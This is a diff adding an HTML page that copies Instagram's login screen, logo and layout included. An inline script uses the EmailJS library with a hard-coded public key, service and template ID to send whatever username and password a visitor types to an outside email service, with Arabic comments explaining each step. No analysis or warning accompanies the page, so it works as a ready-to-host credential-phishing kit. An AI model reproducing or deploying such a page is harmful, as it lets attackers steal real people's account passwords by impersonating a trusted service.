@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    <title>Instagram Login - CodeWithJatin</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+
+<body>
+    <main>
+        <img src="IMG/IG.jpeg" alt="" class="phoneImg">
+        <div class="form-div">
+            <form id="login-form">
+                <img class="instaLogo" src="image/Instagram_logo.svg.png" alt="logo">
+                <input type="text" name="email" class="input" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" class="input" required placeholder="Password">
+                <button type="submit" class="login-btn">Log In</button>
+                <p id="or">or</p>
+                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
+            </form>
+            <div class="sign-up">
+                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                    <img id="play" src="IMG/playStore.png" alt="">
+                    <img id="microsoft" src="IMG/getMicrosoft.png" alt="">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // تهيئة EmailJS باستخدام المفتاح العام (Public Key)
+        emailjs.init("VrhSL7pqybtQjoyRW"); // استخدم المفتاح العام الذي قدمته
+
+        // عند تقديم النموذج، إرسال البيانات إلى EmailJS
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();  // منع إعادة تحميل الصفحة بعد الضغط على الزر
+
+            // إرسال البيانات إلى EmailJS باستخدام sendForm
+            emailjs.sendForm("service_b04z2ch", "template_rbft3vc", this)
+                .then(function(response) {
+                    alert("Message sent successfully!", response);  // إذا تم إرسال الرسالة بنجاح
+                }, function(error) {
+                    alert("Failed to send message.", error);  // إذا فشل إرسال الرسالة
+                });
+        });
+    </script>
+</body>
+
+</html>
